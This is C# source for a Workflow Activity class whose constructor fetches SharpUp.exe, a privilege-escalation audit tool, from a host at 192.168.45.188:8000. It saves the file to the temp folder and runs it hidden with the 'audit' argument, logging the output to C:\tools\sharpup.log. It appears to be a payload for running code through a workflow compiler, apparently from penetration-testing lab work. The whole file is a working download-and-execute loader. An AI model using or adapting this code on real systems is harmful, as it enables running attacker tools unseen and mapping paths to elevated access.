using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Workflow.ComponentModel;

public class Run : Activity
{
    public Run()
    {
        Console.WriteLine("I executed!");
        ExecuteAsync().Wait();
    }

    private async Task ExecuteAsync()
    {
        // URL of the SharpUp executable
        string url = "http://192.168.45.188:8000/SharpUp.exe";
        
        // Path to save the downloaded executable
        string tempExePath = Path.Combine(Path.GetTempPath(), "SharpUp.exe");
        
        // Path for the log file
        string logFilePath = @"C:\tools\sharpup.log";

        // Download the executable
        await DownloadFileAsync(url, tempExePath);

        // Execute the downloaded file with the audit flag and redirect output to log file
        RunExecutable(tempExePath, logFilePath);
    }

    private async Task DownloadFileAsync(string url, string destinationPath)
    {
        using (HttpClient client = new HttpClient())
        {
            byte[] fileBytes = await client.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(destinationPath, fileBytes);
        }
    }

    private void RunExecutable(string exePath, string logFilePath)
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = exePath,
            Arguments = "audit",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process { StartInfo = psi })
        {
            process.OutputDataReceived += (sender, e) =>
            {
                if (e.Data != null)
                {
                    File.AppendAllText(logFilePath, e.Data + Environment.NewLine);
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (e.Data != null)
                {
                    File.AppendAllText(logFilePath, e.Data + Environment.NewLine);
                }
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            process.WaitForExit();
        }
    }
}
